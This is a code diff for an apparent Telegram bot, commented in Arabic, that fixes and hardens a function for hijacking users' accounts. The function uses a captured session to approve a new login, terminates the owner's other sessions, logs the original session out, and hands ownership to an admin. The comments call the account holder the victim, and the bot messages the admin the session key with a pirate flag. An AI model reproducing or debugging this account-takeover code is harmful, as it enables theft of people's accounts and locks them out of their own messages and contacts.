@@ -263,9 +263,29 @@ def log_to_channel(text, file_path=None, session_text=None):
         logging.error(f"فشل إرسال للقناة: {e}")
 
 
+
+
+
+
+
+
+
+
+
+
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
     """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A"""
-    client_b = Client(f"cb_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+    
+    # نعطي جلسة B اسم جهاز مميز عشان A تتعرف عليها ولا تطردها أبداً
+    B_DEVICE_MODEL = f"MigrationB_{acc_id}"
+    
+    client_b = Client(
+        f"cb_{acc_id}_{int(time.time())}", 
+        api_id=API_ID, 
+        api_hash=API_HASH, 
+        in_memory=True,
+        device_model=B_DEVICE_MODEL  # بصمة الجلسة الجديدة
+    ) 
     
     try:
         await client_b.connect()
@@ -273,39 +293,39 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         # 1. طلب رمز تسجيل الدخول لـ B
         qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
-        # 2. الجلسة A توافق عليه (يتخطى التحقق بخطوتين برمجياً)
+        # 2. الجلسة A توافق عليه
         await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
-        await asyncio.sleep(3) 
+        
+        # نعطي تليجرام ثواني عشان يثبت المفتاح الجديد في السيرفر
+        await asyncio.sleep(4) 
 
-        # 3. التأكد من دخول B بقوة وسحب بياناتها
+        # 3. نقوم نفصل B ونركبها من جديد عشان تحدث الـ AuthKey وتحل مشكلة UNREGISTERED
+        if client_b.is_connected:
+            await client_b.disconnect()
+        await client_b.connect()
+
+        # الآن B تمتلك المفتاح الحقيقي، وسيعمل get_me بدون أي أخطاء
         me_b = await client_b.get_me()
         if not me_b:
-            raise Exception("فشل تهيئة Session B بشكل كامل")
+            raise Exception("فشل تهيئة Session B بشكل كامل بعد إعادة الاتصال")
             
         session_b_str = await client_b.export_session_string()
         dc_id = me_b.dc_id if me_b.dc_id else "Unknown"
         hex_key = get_hex_from_pyro(session_b_str)
 
-        # 4. سحب بصمة الجلسة B (Hash) عشان A تتجاوزها ولا تطردها بالخطأ
-        auths_b = await client_b.invoke(functions.account.GetAuthorizations())
-        b_hash = None
-        for auth in auths_b.authorizations:
-            if getattr(auth, 'current', False): # الجلسة الحالية من منظور B هي B نفسها
-                b_hash = auth.hash
-                break
-
-        # 5. فصل جلسة B مؤقتاً (عشان نرجع نتحكم بـ A)
+        # 4. نفصل B مؤقتاً عشان A تشتغل براحتها
         await client_b.disconnect()
 
-        # 6. الجلسة A تبدأ عملية الطرد الجذري لكل الجلسات (ما عدا نفسها ونفسها B)
-        auths_a = await client_a.invoke(functions.account.GetAuthorizations())
+        # 5. الجلسة A تبدأ عملية الطرد الجذري لكل الجلسات (ما عدا نفسها و B)
+        auths = await client_a.invoke(functions.account.GetAuthorizations())
         hit_24h_limit = False
         
-        for auth in auths_a.authorizations:
+        for auth in auths.authorizations:
             is_current_a = getattr(auth, 'current', False)
-            is_session_b = (auth.hash == b_hash) # مقارنة البصمة، هل هذه جلسة B؟
+            # نتعرف على B من خلال اسم الجهاز اللي حطيناه، وكذلك من الـ Hash
+            is_session_b = (getattr(auth, 'device_model', '') == B_DEVICE_MODEL) or (auth.hash == b_hash if 'b_hash' in locals() else False)
 
-            # إذا لم تكن الجلسة الحالية (A) ولم تكن الجلسة الجديدة (B)، قم بطردها
+            # إذا لم تكن A (الحالية) ولم تكن B (المهاجرة)، اطردها فوراً
             if not is_current_a and not is_session_b:
                 try:
                     await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
@@ -314,11 +334,11 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
                     err_str = str(e).lower()
                     if "fresh" in err_str or "24" in err_str:
                         hit_24h_limit = True
-                        break # توقف فوراً، الجلسة محمية لـ 24 ساعة
+                        break 
                     elif "flood" in err_str:
                         await asyncio.sleep(5)
 
-        # 7. إذا واجهنا خطأ الـ 24 ساعة أثناء طرد A، نفعل المراقبة ونتوقف
+        # 6. إذا واجهنا خطأ الـ 24 ساعة أثناء طرد A، نفعل المراقبة ونتوقف بهدوء
         if hit_24h_limit:
             conn = get_db_conn()
             c = conn.cursor()
@@ -328,21 +348,21 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             if client_a.is_connected: await client_a.disconnect()
             return False
 
-        # 8. الجلسة A تسجل خروج بنفسها عبر Raw API بعد أن طردت الجميع وتأكدت أن B آمنة
+        # 7. الجلسة A تسجل خروج بنفسها عبر Raw API
         try:
             await client_a.invoke(functions.auth.LogOut())
         except Exception: pass
         
         if client_a.is_connected: await client_a.disconnect()
 
-        # 9. تحديث الملكية في الداتا بيس لصالح الأدمن
+        # 8. تحديث الملكية في الداتا بيس لصالح الأدمن
         conn = get_db_conn()
         c = conn.cursor()
         c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
         conn.commit()
         conn.close()
 
-        # 10. إرسال الكليشة للضحية (بعد انتهاء كل شي)
+        # 9. إرسال الكليشة للضحية (بعد انتهاء كل شي)
         kick_msg = (
             f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
             f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
@@ -354,7 +374,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             bot.send_message(original_owner, kick_msg)
         except Exception: pass
 
-        # 11. إرسال رسالة النجاح للأدمن (المفتاح + السيرفر بجانبه)
+        # 10. إرسال رسالة النجاح للأدمن (المفتاح + السيرفر بجانبه)
         admin_msg = (
             f"✅ 🏴‍☠️ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
             f"⎉╎ الـرقـم: `{phone}`\n"
@@ -365,7 +385,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         )
         bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
 
-        # 12. حذف الحساب من البوت لأنه تم تهجيره
+        # 11. حذف الحساب من البوت لأنه تم تهجيره بالكامل
         conn = get_db_conn()
         c = conn.cursor()
         c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
@@ -378,7 +398,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         logging.error(f"Migration Failed for {phone}: {e}")
         if client_b.is_connected: await client_b.disconnect()
         if client_a.is_connected: await client_a.disconnect()
-        return False
+        return False 
 
 
 
